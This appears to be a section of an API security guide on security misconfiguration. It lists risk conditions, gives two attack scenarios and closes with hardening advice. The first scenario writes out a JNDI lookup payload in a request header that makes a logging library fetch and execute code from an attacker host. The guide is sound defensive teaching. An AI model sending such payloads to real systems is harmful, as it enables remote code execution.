The API might be vulnerable if:

- Appropriate security hardening is missing across any part of the API stack, or if there are improperly configured permissions on cloud services
- The latest security patches are missing, or the systems are out of date
- Unnecessary features are enabled (e.g. HTTP verbs, logging features)
- There are discrepancies in the way incoming requests are processed by servers in the HTTP server chain
- Transport Layer Security (TLS) is missing
- Security or cache control directives are not sent to clients
- A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set
- Error messages include stack traces, or expose other sensitive information

## Example Attack Scenarios

### Scenario #1

An API back-end server maintains an access log written by a popular third-party open-source logging utility with support for placeholder expansion and JNDI (Java Naming and Directory Interface) lookups, both enabled by default. For each request, a new entry is written to the log file with the following pattern: `<method> <api_version>/<path> - <status_code>`.

A bad actor issues the following API request, which gets written to the access log file:

```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

Due to the insecure default configuration of the logging utility and a permissive network outbound policy, in order to write the corresponding entry to the access log, while expanding the value in the `X-Api-Version`request header, the logging utility will pull and execute the `Malicious.class` object from the attacker's remote controlled server.

### Scenario #2

A social network website offers a "Direct Message" feature that allows users to keep private conversations. To retrieve new messages for a specific conversation, the website issues the following API request (user interaction is not required):

```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

Because the API response does not include the `Cache-Control` HTTP response header, private conversations end-up cached by the web browser, allowing malicious actors to retrieve them from the browser cache files in the filesystem.

## How To Prevent

The API life cycle should include:

- A repeatable hardening process leading to fast and easy deployment of a properly locked down environment
- A task to review and update configurations across the entire API stack. The review should include: orchestration files, API components, and cloud services (e.g. S3 bucket permissions)
- An automated process to continuously assess the effectiveness of the configuration and settings in all environments

Furthermore:

- Ensure that all API communications from the client to the API server and any downstream/upstream components happen over an encrypted communication channel (TLS), regardless of whether it is an internal or public-facing API.
- Be specific about which HTTP verbs each API can be accessed by: all other HTTP verbs should be disabled (e.g. HEAD).
- APIs expecting to be accessed from browser-based clients (e.g., WebApp front-end) should, at least:
- implement a proper Cross-Origin Resource Sharing (CORS) policy
- include applicable Security Headers
- Restrict incoming content types/data formats to those that meet the business/ functional requirements.
- Ensure all servers in the HTTP server chain (e.g. load balancers, reverse and forward proxies, and back-end servers) process incoming requests in a uniform manner to avoid desync issues.
- Where applicable, define and enforce all API response payload schemas, including error responses, to prevent exception traces and other valuable information from being sent back to attackers.
